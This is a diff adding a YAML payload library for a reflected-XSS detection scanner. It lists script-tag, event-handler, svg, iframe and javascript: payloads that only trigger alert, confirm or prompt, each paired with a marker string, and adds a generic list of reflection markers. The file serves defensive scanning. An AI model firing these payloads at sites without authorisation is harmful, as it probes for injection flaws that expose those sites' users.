@@ -1,0 +1,46 @@
+version: "1.0"
+description: "XSS payload library for reflected and stored XSS detection"
+
+reflected:
+  payloads:
+    - payload: '<script>alert(1)</script>'
+      marker: '<script'
+    - payload: '<script>confirm(1)</script>'
+      marker: '<script'
+    - payload: '<script>prompt(1)</script>'
+      marker: '<script'
+    - payload: '"><img src=x onerror=alert(1)>'
+      marker: 'onerror='
+    - payload: "' onmouseover='alert(1)"
+      marker: 'onmouseover='
+    - payload: '" onmouseover="alert(1)'
+      marker: 'onmouseover='
+    - payload: '<svg onload=alert(1)>'
+      marker: '<svg'
+    - payload: '<svg/onload=alert(1)>'
+      marker: '<svg'
+    - payload: '<body onload=alert(1)>'
+      marker: '<body'
+    - payload: '<iframe src="javascript:alert(1)">'
+      marker: '<iframe'
+    - payload: '<h1>xss_test_marker</h1>'
+      marker: 'xss_test_marker'
+    - payload: '<b>xss_test_marker</b>'
+      marker: 'xss_test_marker'
+
+# Generic reflection markers used for detection
+reflection_markers:
+  - "<script"
+  - "onerror="
+  - "onload="
+  - "onmouseover="
+  - "<svg"
+  - "<iframe"
+  - "javascript:"
+  - "xss_test_marker"
+
+# Future expansion: dom_based, stored, template_injection, etc.
+# dom_based:
+#   payloads:
+#     - payload: '#<img src=x onerror=alert(1)>'
+#       sink: 'innerHTML'
